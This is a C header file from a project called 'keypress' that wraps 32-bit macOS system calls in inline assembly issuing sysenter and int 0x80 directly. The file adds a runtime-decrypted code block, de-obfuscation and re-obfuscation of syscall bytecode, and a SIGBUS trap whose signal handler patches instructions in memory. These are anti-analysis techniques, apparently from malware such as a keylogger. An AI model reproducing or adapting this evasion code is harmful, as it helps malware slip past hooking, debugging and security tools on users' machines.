//
//  syscall.h
//  keypress
//
//  Created by armored on 28/03/14.
//  Copyright (c) 2014 -. All rights reserved.
//

#ifndef keypress_syscall_h
#define keypress_syscall_h

#include <signal.h>

#include "dynamic_enc.h"

void dmh_mmap_end_v1();
void dmh_mmap_enc_v1();
__attribute__ ((visibility ("default"))) void sys_mmap();

void* _dmh_mmap_v1(void *addr, size_t len, int prot, int flags, int filedes, int offset)
{
  void* dmh_mmap_end_ptr = dmh_mmap_end_v1;
  
  dynamic_enc_t dyn_enc = (void*)DYNAMIC_ENC;
  
  /////////////////////////////////
  // decryptin code block
  /////////////////////////////////
  __asm __volatile__
  (
    "call   dmh_mmap_enc_v1\n"
   "dmh_mmap_enc_v1:\n"
    "movl   %0, %%eax\n"
    "push   %%eax\n"
    "call   %1\n"
    "test   %%eax, %%eax\n"
   : 
   : "m" (dmh_mmap_end_ptr), "m" (dyn_enc)
   : "ebx", "eax"
   );
  
  /////////////////////////////////
  // Encrypted code block: begin
  /////////////////////////////////
  void* ret_val = 0;
  
  __asm __volatile__
  (
   "push  %6\n"
   "push  %5\n"
   "push  %4\n"
   "push  %3\n"
   "push  %2\n"
   "push  %1\n"
   "push  $0xC5\n"
   "movl  $0xC5, %%eax\n"
   "call  _sys_mmap_v1\n"
   "jmp   dmmap_exit_v1\n"
   "_sys_mmap_v1:"
   "pop   %%edx\n"
   "mov   %%esp, %%ecx\n"
   "sysenter\n"
   "nopl  (%%eax)\n"
   "dmmap_exit_v1:"
   "add   $0x1C, %%esp\n"
   "mov   %%eax, %0\n"
   : "=r" (ret_val)
   : "m" (addr), "m" (len), "m" (prot), "m" (flags), "m" (filedes), "m" (offset)
   : "eax", "ecx", "esp"
   );
  
  return ret_val;
  /////////////////////////////////
  // Encrypted code block: end
  /////////////////////////////////
}

void dmh_mmap_end_v1()
{
}

int mh_exit(int oflag)
{
  int ret_val = 0;
  
  __asm __volatile__
  (
   "push  %1\n"
   "push  $0x01\n"
   "movl  $0x01, %%eax\n"
   "movl  %%esp, %%ecx\n"
   "sysenter\n"
   "addl  $0x8, %%esp\n"
   "movl  %%eax, %0\n"
   : "=r" (ret_val)
   : "r" (oflag)
   : "eax", "ecx"
   );
  
  return ret_val;
}

long long mh_lseek(int fildes, long long offxet, int whence)
{
  long long _val = 0;
  
  __asm __volatile__
  (
   "push  %3\n"
   "push  %2\n"
   "push  %1\n"
   "push  $0xC7\n"
   "movl  $0xC7, %%eax\n"
   "call  sysc_lseek\n"
   "jmp   lseek_exit\n"
   "sysc_lseek:"
   "pop   %%edx\n"
   "mov   %%esp, %%ecx\n"
   "sysenter\n"
   "nopl  (%%eax)\n"
   "lseek_exit:"
   "addl  $0x10, %%esp\n"
   "movl  %%eax, %0\n"
   : "=r" (_val)
   : "m" (fildes), "m" (offxet), "m" (whence)
   : "eax", "ecx"
   );
  
  return _val;
}

int mh_open(const char *path, int oflag)
{
  int ret_val = 0;
  
  __asm __volatile__
  (
   "push  %2\n"
   "push  %1\n"
   "push  $0x5\n"
   "movl  $0x5, %%eax\n"
   "call  sysc_open\n"
   "jmp   open_exit\n"
   "sysc_open:"
   "pop   %%edx\n"
   "mov   %%esp, %%ecx\n"
   "sysenter\n"
   "nopl  (%%eax)\n"
   "open_exit:"
   "addl  $0xC, %%esp\n"
   "movl  %%eax, %0\n"
   : "=r" (ret_val)
   : "m" (path), "m" (oflag)
   : "eax", "ecx", "edx", "esp"
   );
  
  return ret_val;
}

ssize_t __mh_read(int fildes, void *buf, size_t nbyte)
{
  ssize_t ret_val = 0;
  
  __asm __volatile__
  (
   "push  %3\n"
   "push  %2\n"
   "push  %1\n"
   "push  $0x3\n"
   "movl  $0x3, %%eax\n"
   "call  sys_read\n"
   "jmp   read_exit\n"
   "sys_read:"
   "pop   %%edx\n"
   "mov   %%esp, %%ecx\n"
   "sysenter\n"
   "nopl  (%%eax)\n"
   "read_exit:"
   "addl  $0x10, %%esp\n"
   "movl  %%eax, %0\n"
   : "=r" (ret_val)
   : "m" (fildes), "m" (buf), "m" (nbyte)
   : "eax", "ecx", "esp"
   );
  
  return ret_val;
}

void* mh_mmap(void *addr, size_t len, int prot, int flagx, int filedes, int offxet)
{
  void* ret_val = 0;
  
  // original_bytecode;
  // {pop edx;mov esp, ecx; sysenter;} = 0x0fe1895a;
  
  __asm __volatile__
  (
   "push  %6\n"
   "push  %5\n"
   "push  %4\n"
   "push  %3\n"
   "push  %2\n"
   "push  %1\n"
   "push  $0xC5\n"
   "movl  $0xC5, %%eax\n"
   "call  _sys_resolve_mmap\n"
  "_sys_resolve_mmap:"
   "popl  %%ebx\n"
   "addl  $0x14, %%ebx\n"
   "movl  $0x0fe1895a, (%%ebx)\n" /* de obfuscate */
   "call  _sys_mmap_enc\n"
   "jmp   _sys_mmap_exit\n"
  "_sys_mmap_enc:"                /* bytecode obfuscation begin */
   "pop   %%edx\n"
   "mov   %%esp, %%ecx\n"
   "sysenter\n"
   "nopl  (%%eax)\n"              /* bytecode obfuscation end */
   "nop\n"
  "_sys_mmap_exit:"
   "movl  $0x8Bc4458B, (%%ebx)\n" /* re obfuscate */
   "add   $0x1C, %%esp\n"
   "mov   %%eax, %0\n"
   : "=r" (ret_val)
   : "m" (addr), "m" (len), "m" (prot), "m" (flagx), "m" (filedes), "m" (offxet)
   : "eax", "ecx", "esp", "ebx"
   );
  
  return ret_val;
}

int mh_mprotect(void *addr, size_t len, int prot)
{
  int ret_val = 0;
  
  __asm __volatile__
  (
   "push  %3\n"
   "push  %2\n"
   "push  %1\n"
   "push  $0x4a\n"
   "mov   $0x4a, %%eax\n"
   "call  sys_prot\n"
   "jmp   prot_exit\n"
  "sys_prot:"
   "pop   %%edx\n"
   "mov   %%esp, %%ecx\n"
   "sysenter\n"
   "nopl  (%%eax)\n"
  "prot_exit:"
   "add   $0x10, %%esp\n"
   "mov   %%eax, %0\n"
   : "=r" (ret_val)
   : "m" (addr), "m" (len), "m" (prot)
   : "eax", "ecx", "esp"
   );
  
  return ret_val;
}

#ifdef SYS_INCLUDED

__attribute__ ((visibility ("default"))) void sys_mmap_v2();

int mh_fork()
{
  int ret_val = -1;
  
  __asm __volatile__
  (
   "subl   $0x1c, %%esp\n"
   "movl   $0x2, %%eax\n"
   "int    $0x80\n"
   "jnb    fork_ok\n"
   "movl   $0xffffffff, %0\n"
   "jmp    fork_exit\n"
   "fork_ok:"
   "or     %%edx, %%edx\n"
   "jz     fork_exit\n"
   "xor    %%eax, %%eax\n"
   "fork_exit:"
   "movl %%eax, %%eax\n"
   "addl   $0x1c, %%esp\n"
   : "=r" (ret_val)
   :
   : "eax", "esp", "edx"
   );
  
  return ret_val;
}

// how to call this
//  void*               _sigtramp        = (void*)0xFF;
//  _sigtramp              = endpcall - patched_param->sigtramp_offset - ENDCALL_LEN;
//  struct sigaction act;
//  act.sa_sigaction = (void*)&hdl;
//  act.sa_mask = 0;
//  act.sa_flags = SA_SIGINFO;
//
//  mh_sigaction(15, &act, NULL, _sigtramp);

void* _dmh_mmap_v2(void *addr, size_t len, int prot, int flagx, int filedes, int offxet)
{
  void* ret_val = 0;
  
  // original_bytecode;
  // {pop edx;mov esp, ecx; sysenter;} = 0x0fe1895a;
  
  __asm __volatile__
  (
   //   "int $0x3\n"
   "push  %6\n"
   "push  %5\n"
   "push  %4\n"
   "push  %3\n"
   "push  %2\n"
   "push  %1\n"
   "push  $0xC5\n"
   "movl  $0xC5, %%eax\n"
   "call  _sys_mmap_v2\n"
   "jmp   mmap_exit_v2\n"
   "_sys_mmap_v2:"
   /* trap sigbus*/
   "movl  0xffffffed, %%esi\n"
   "movl  $0xFF, (%%esi)\n"
   "nop\n"
   "nop\n"
   /* bytecode obfuscation: begin */
   "pop   %%edx\n"
   "mov   %%esp, %%ecx\n"
   "sysenter\n"
   /* bytecode obfuscation: end */
   "nopl  (%%eax)\n"
   "mmap_exit_v2:"
   "add   $0x1C, %%esp\n"
   "mov   %%eax, %0\n"
   : "=r" (ret_val)
   : "m" (addr), "m" (len), "m" (prot), "m" (flagx), "m" (filedes), "m" (offxet)
   : "eax", "ecx", "esp", "ebx"
   );
  
  return ret_val;
}

void sigtramp(void *a1, int a2, int a3, int a4, int a5)
{
  int p1, p2, p3, p4, p5, p6;
  p1 = p2 = p3 = p4 = p5 = p6 = 0;
  void *a5p = 0;
  a5p = (void*)a5;
  
  ((void (*)(int, int, int))a1)(a3, a4, a5);
  
  __asm __volatile__
  (
   "movl  %0, %%esi\n"
   "movl  %%esi, (%%esp)\n"
   "movl  %1, %%esi\n"
   "movl  %%esi, 0x4(%%esp)\n"
   "movl  $0x1e, 0x8(%%esp)\n"
   "movl  $0xb8, %%eax\n"
   "int   $0x80\n"  /*AUE_SIGRETURN*/
   :
   : "m" (a3), "m" (a5p)
   : "eax", "esi", "esp"
   );
}

void hdl (int sig, siginfo_t *siginfo, ucontext_t *context)
{
  char* patch_addr      = (char*)context->uc_mcontext->__ss.__eip;
  int   dec_indicator   = (int)  context->uc_mcontext->__ss.__esi;
  int   patched_bytcode = 0;
  
  switch (dec_indicator)
  {
    case 0xffffffed:
      patched_bytcode = 0x0fe1895a;
      break;
  }
  
  __asm __volatile__
  (
   //"int $0x3\n"
   "movl  %0, %%esi\n"
   "movl  $0x90909090, (%%esi)\n"
   "movl  $0x90909090, 0x4(%%esi)\n"
   "movl  %1, %%eax\n"
   "movl  %%eax, 0x8(%%esi)\n"
   :
   : "m" (patch_addr), "m" (patched_bytcode)
   : "esi"
   );
  
}

int mh_sigaction(int sig, struct sigaction * act, struct sigaction *oact, void* tramp)
{
  int ret_val;
  
  struct  __sigaction _sa_s;
  struct  __sigaction *_sa_ptr = &_sa_s;
  
  _sa_s.__sigaction_u.__sa_sigaction = act->sa_sigaction;
  _sa_s.sa_tramp      = (void*)tramp;
  _sa_s.sa_mask       = act->sa_mask;
  _sa_s.sa_flags      = act->sa_flags;
  
  __asm __volatile__
  (
   "int $0x3\n"
   "push  %3\n"
   "push  %2\n"
   "push  %1\n"
   "push  $0xc002e\n"
   "movl  $0xc002e, %%eax\n"
   "call  sys_sigact\n"
   "jmp   sigact_exit\n"
   "sys_sigact:\n"
   "popl   %%edx\n"
   "mov   %%esp, %%ecx\n"
   "sysenter\n"
   "nopl  (%%eax)\n"
   "sigact_exit:\n"
   "add   $0x10, %%esp\n"
   "mov   %%eax, %0\n"
   : "=r" (ret_val)
   : "m" (sig), "m" (_sa_ptr), "m" (oact)
   : "eax", "ecx", "esp", "edx"
   );
  
  return  ret_val;
}

int mh_bsdthread_create(void *addr, void* arg, int stack_size, int arg1, int arg2)
{
  int ret_val = 0;
  
  __asm __volatile__
  (
   "push  %5\n"
   "push  %4\n"
   "push  %3\n"
   "push  %2\n"
   "push  %1\n"
   "push  $0x140168\n"
   "movl  $0x140168, %%eax\n"
   "call  sys_thd\n"
   "jmp   thd_exit\n"
   "sys_thd:"
   "pop   %%edx\n"
   "mov   %%esp, %%ecx\n"
   "sysenter\n"
   "nopl  (%%eax)\n"
   "thd_exit:"
   "add   $0x18, %%esp\n"
   "mov   %%eax, %0\n"
   : "=r" (ret_val)
   : "m" (addr), "m" (arg), "m" (stack_size), "m" (arg1), "m" (arg2)
   : "eax", "ecx", "esp"
   );
  
  return ret_val;
}

#endif

#endif
